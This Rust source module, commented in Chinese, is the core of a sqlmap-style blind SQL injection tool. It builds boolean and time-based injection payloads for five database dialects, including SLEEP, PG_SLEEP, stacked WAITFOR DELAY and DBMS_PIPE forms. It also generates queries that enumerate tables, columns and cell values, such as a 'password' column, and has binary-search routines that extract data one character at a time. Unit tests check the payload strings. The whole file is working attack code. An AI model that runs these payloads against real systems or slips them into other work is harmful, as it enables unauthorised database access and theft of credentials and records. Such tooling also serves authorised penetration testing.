//! sqlmap 式**盲注取数 / 库表枚举**的纯函数内核。
//!
//! 当报错外带 / 联合查询不可用时,只能靠**布尔 / 时间盲注**逐字符把数据「问」出来:
//! 对每个字符二分它的 ASCII 码(`ASCII(SUBSTR((子查询),pos,1)) > mid?`),问 7 次定一个字节。
//! 本模块提供:
//! - **取数原语**:`length_expr` / `char_code_expr`(各方言的 LENGTH/SUBSTR/ASCII 差异)。
//! - **注入封装**:`bool_inject`(布尔条件)/ `time_inject`(条件成立才睡眠)。
//! - **库表枚举查询**:当前库 / 表数 / 第 i 张表名 / 列数 / 第 i 列名 / 行数 / 单元格(各方言分页差异)。
//! - **二分解码器**:`search_byte` / `search_length`(纯函数,可用 mock oracle 单测)。
//!
//! 这些「子查询字符串」既可喂给盲注逐字符提取,也可直接喂给报错外带 / 联合查询(快通道)。

use crate::dialect::Dbms;
use crate::payloads::Boundary;

/// 转义单引号(把标识符 / 字面量安全嵌进 SQL 字符串字面量)。
fn esc(s: &str) -> String {
    s.replace('\'', "''")
}

/// 字符串长度表达式(MSSQL 用 `LEN`,其余 `LENGTH`)。
pub fn length_expr(dbms: Dbms, inner: &str) -> String {
    match dbms {
        Dbms::MsSql => format!("LEN(({inner}))"),
        _ => format!("LENGTH(({inner}))"),
    }
}

/// 取 `inner` 第 `pos`(1 基)个字符的字符码表达式(SQLite 用 `UNICODE`,其余 `ASCII`;
/// MSSQL 用 `SUBSTRING`,其余 `SUBSTR`)。
pub fn char_code_expr(dbms: Dbms, inner: &str, pos: usize) -> String {
    match dbms {
        Dbms::MsSql => format!("ASCII(SUBSTRING(({inner}),{pos},1))"),
        Dbms::Sqlite => format!("UNICODE(SUBSTR(({inner}),{pos},1))"),
        _ => format!("ASCII(SUBSTR(({inner}),{pos},1))"),
    }
}

/// 布尔盲注注入值:`{value}{prefix} AND ({condition}){suffix}`。
pub fn bool_inject(value: &str, boundary: Boundary, condition: &str) -> String {
    format!(
        "{value}{} AND ({condition}){}",
        boundary.prefix, boundary.suffix
    )
}

/// 时间盲注注入值:条件成立才让数据库睡 `secs` 秒(各方言 IF/CASE 差异);不支持(SQLite)返回 `None`。
pub fn time_inject(
    value: &str,
    boundary: Boundary,
    dbms: Dbms,
    condition: &str,
    secs: u32,
) -> Option<String> {
    let p = boundary.prefix;
    let s = boundary.suffix;
    let frag = match dbms {
        Dbms::MySql => format!("AND (SELECT IF(({condition}),SLEEP({secs}),0))"),
        Dbms::PostgreSql => {
            format!("AND 1=(CASE WHEN ({condition}) THEN (SELECT 1 FROM PG_SLEEP({secs})) ELSE 1 END)")
        }
        Dbms::MsSql => {
            // 堆叠:条件成立才 WAITFOR。用 `;` 分隔。
            return Some(format!(
                "{value}{p};IF({condition}) WAITFOR DELAY '0:0:{secs}'{s}"
            ));
        }
        Dbms::Oracle => format!(
            "AND {secs}=(CASE WHEN ({condition}) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(98),{secs}) ELSE {secs} END)"
        ),
        Dbms::Sqlite => return None,
    };
    Some(format!("{value}{p} {frag}{s}"))
}

// ───────────────────────── 库表枚举(返回「子查询标量」字符串)─────────────────────────

/// 当前库 / schema 的表数量子查询。
pub fn tables_count_query(dbms: Dbms) -> String {
    match dbms {
        Dbms::MySql => {
            "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()".into()
        }
        Dbms::PostgreSql => {
            "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=current_schema()"
                .into()
        }
        Dbms::MsSql => "SELECT COUNT(*) FROM information_schema.tables WHERE table_type='BASE TABLE'"
            .into(),
        Dbms::Oracle => "SELECT COUNT(*) FROM user_tables".into(),
        Dbms::Sqlite => "SELECT COUNT(*) FROM sqlite_master WHERE type='table'".into(),
    }
}

/// 第 `idx`(0 基)张表名子查询。
pub fn table_name_query(dbms: Dbms, idx: usize) -> String {
    match dbms {
        Dbms::MySql => format!(
            "SELECT table_name FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name LIMIT {idx},1"
        ),
        Dbms::PostgreSql => format!(
            "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema() ORDER BY table_name LIMIT 1 OFFSET {idx}"
        ),
        Dbms::MsSql => format!(
            "SELECT name FROM sysobjects WHERE xtype='U' ORDER BY name OFFSET {idx} ROWS FETCH NEXT 1 ROWS ONLY"
        ),
        Dbms::Oracle => format!(
            "SELECT table_name FROM (SELECT table_name,ROWNUM rn FROM user_tables ORDER BY table_name) WHERE rn={}",
            idx + 1
        ),
        Dbms::Sqlite => format!(
            "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET {idx}"
        ),
    }
}

/// 表 `table` 的列数量子查询。
pub fn columns_count_query(dbms: Dbms, table: &str) -> String {
    let tn = esc(table);
    match dbms {
        Dbms::MySql => format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=database() AND table_name='{tn}'"
        ),
        Dbms::PostgreSql => format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{tn}'"
        ),
        Dbms::MsSql => format!(
            "SELECT COUNT(*) FROM information_schema.columns WHERE table_name='{tn}'"
        ),
        Dbms::Oracle => format!("SELECT COUNT(*) FROM all_tab_columns WHERE table_name='{tn}'"),
        Dbms::Sqlite => format!("SELECT COUNT(*) FROM pragma_table_info('{tn}')"),
    }
}

/// 表 `table` 第 `idx`(0 基)列名子查询。
pub fn column_name_query(dbms: Dbms, table: &str, idx: usize) -> String {
    let tn = esc(table);
    match dbms {
        Dbms::MySql => format!(
            "SELECT column_name FROM information_schema.columns WHERE table_schema=database() AND table_name='{tn}' ORDER BY ordinal_position LIMIT {idx},1"
        ),
        Dbms::PostgreSql => format!(
            "SELECT column_name FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='{tn}' ORDER BY ordinal_position LIMIT 1 OFFSET {idx}"
        ),
        Dbms::MsSql => format!(
            "SELECT column_name FROM information_schema.columns WHERE table_name='{tn}' ORDER BY ordinal_position OFFSET {idx} ROWS FETCH NEXT 1 ROWS ONLY"
        ),
        Dbms::Oracle => format!(
            "SELECT column_name FROM (SELECT column_name,ROWNUM rn FROM all_tab_columns WHERE table_name='{tn}' ORDER BY column_id) WHERE rn={}",
            idx + 1
        ),
        Dbms::Sqlite => format!(
            "SELECT name FROM pragma_table_info('{tn}') ORDER BY cid LIMIT 1 OFFSET {idx}"
        ),
    }
}

/// 表 `table` 的行数子查询。
pub fn rows_count_query(dbms: Dbms, table: &str) -> String {
    let _ = dbms;
    format!("SELECT COUNT(*) FROM {table}")
}

/// 表 `table` 第 `row`(0 基)行、`column` 列的单元格值子查询(转成文本便于逐字符提取)。
pub fn cell_query(dbms: Dbms, table: &str, column: &str, row: usize) -> String {
    match dbms {
        Dbms::MySql => format!(
            "SELECT CAST({column} AS CHAR) FROM {table} ORDER BY 1 LIMIT {row},1"
        ),
        Dbms::PostgreSql => format!(
            "SELECT CAST({column} AS TEXT) FROM {table} ORDER BY 1 LIMIT 1 OFFSET {row}"
        ),
        Dbms::MsSql => format!(
            "SELECT CAST({column} AS NVARCHAR(4000)) FROM {table} ORDER BY 1 OFFSET {row} ROWS FETCH NEXT 1 ROWS ONLY"
        ),
        Dbms::Oracle => format!(
            "SELECT c FROM (SELECT CAST({column} AS VARCHAR2(4000)) c,ROWNUM rn FROM {table}) WHERE rn={}",
            row + 1
        ),
        Dbms::Sqlite => format!("SELECT CAST({column} AS TEXT) FROM {table} LIMIT 1 OFFSET {row}"),
    }
}

// ───────────────────────── 二分解码器(纯函数,mock oracle 可单测)─────────────────────────

/// 二分定位一个字符码:`oracle(n)` = 「真实字符码 > n ?」。返回定位到的字符码(0..=255)。
/// 对每个字符调用 oracle 约 8 次(log2(256))。
pub fn search_byte(oracle: impl Fn(u32) -> bool) -> u8 {
    let (mut lo, mut hi) = (0u32, 255u32);
    while lo < hi {
        let mid = (lo + hi) / 2;
        if oracle(mid) {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    lo as u8
}

/// 二分求字符串长度:`oracle(n)` = 「长度 > n ?」。在 `[0, cap]` 内二分。
pub fn search_length(oracle: impl Fn(u32) -> bool, cap: u32) -> u32 {
    let (mut lo, mut hi) = (0u32, cap);
    while lo < hi {
        let mid = (lo + hi) / 2;
        if oracle(mid) {
            lo = mid + 1;
        } else {
            hi = mid;
        }
    }
    lo
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn primitives_per_dbms() {
        assert_eq!(length_expr(Dbms::MySql, "database()"), "LENGTH((database()))");
        assert_eq!(length_expr(Dbms::MsSql, "db_name()"), "LEN((db_name()))");
        assert_eq!(
            char_code_expr(Dbms::MySql, "database()", 3),
            "ASCII(SUBSTR((database()),3,1))"
        );
        assert_eq!(
            char_code_expr(Dbms::Sqlite, "x", 1),
            "UNICODE(SUBSTR((x),1,1))"
        );
        assert_eq!(
            char_code_expr(Dbms::MsSql, "x", 2),
            "ASCII(SUBSTRING((x),2,1))"
        );
    }

    #[test]
    fn bool_and_time_inject_wrap_boundary() {
        let b = Boundary {
            prefix: "'",
            suffix: " -- -",
        };
        assert_eq!(
            bool_inject("7", b, "ASCII(SUBSTR((database()),1,1))>100"),
            "7' AND (ASCII(SUBSTR((database()),1,1))>100) -- -"
        );
        let mysql = time_inject("7", b, Dbms::MySql, "1=1", 5).unwrap();
        assert!(mysql.contains("IF((1=1),SLEEP(5),0)"));
        let mssql = time_inject("7", b, Dbms::MsSql, "1=1", 5).unwrap();
        assert!(mssql.contains(";IF(1=1) WAITFOR DELAY '0:0:5'"));
        assert!(time_inject("7", b, Dbms::Sqlite, "1=1", 5).is_none());
    }

    #[test]
    fn enumeration_queries_format() {
        assert!(table_name_query(Dbms::MySql, 2).contains("LIMIT 2,1"));
        assert!(table_name_query(Dbms::PostgreSql, 2).contains("OFFSET 2"));
        assert!(table_name_query(Dbms::Oracle, 0).contains("rn=1"));
        assert!(table_name_query(Dbms::Sqlite, 3).contains("sqlite_master"));
        assert!(columns_count_query(Dbms::MySql, "users").contains("table_name='users'"));
        assert!(column_name_query(Dbms::MySql, "users", 1).contains("LIMIT 1,1"));
        assert!(cell_query(Dbms::MySql, "users", "password", 0).contains("CAST(password AS CHAR)"));
        // 单引号转义,防注入子查询里的字面量被破坏。
        assert!(columns_count_query(Dbms::MySql, "a'b").contains("table_name='a''b'"));
    }

    #[test]
    fn search_byte_finds_value() {
        // oracle:真实值 `v`。oracle(n) = v > n。用变量避免与字面量极值比较。
        for v in [65u32, 122, 0, 255, 200] {
            assert_eq!(search_byte(|n| v > n) as u32, v);
        }
    }

    #[test]
    fn search_length_finds_value() {
        for v in [13u32, 0, 64, 33] {
            assert_eq!(search_length(|n| v > n, 64), v);
        }
    }

    /// 端到端模拟:用二分解码器把一个已知字符串「问」出来(oracle 由真实串模拟)。
    #[test]
    fn decode_full_string_via_oracles() {
        let secret = "Sql_1nj";
        let bytes: Vec<u8> = secret.bytes().collect();
        let n = bytes.len() as u32;
        let len = search_length(|x| n > x, 64) as usize;
        assert_eq!(len, secret.len());
        let mut out = String::new();
        for &b in &bytes {
            let code = b as u32;
            let c = search_byte(|x| code > x);
            out.push(c as char);
        }
        assert_eq!(out, secret);
    }
}
